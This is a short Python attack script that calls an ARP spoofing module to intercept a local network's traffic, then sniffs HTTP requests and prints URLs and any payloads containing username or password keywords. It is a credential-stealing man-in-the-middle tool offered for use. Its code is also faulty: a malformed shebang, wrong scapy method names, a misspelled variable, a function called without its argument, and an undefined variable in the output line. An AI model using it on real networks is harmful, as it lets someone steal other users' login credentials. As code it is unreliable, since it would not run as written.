#/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

import os
import sys
sys.path.append(os.path.abspath('../arpSpoof'))

import arpSpoof

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = proccess_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.hasLayer(scapy.Raw): 
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
    for keyword in keywords:
        if keyword in load:
            return laod    

def proccess_sniffed_packet(packet):
    if packet.hasLayer(http.HTTPRequest):
        url = get_url()
    
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + load + "\n\n")
            
def run():
    arpSpoof.run()
    sniff("eth0")        

run()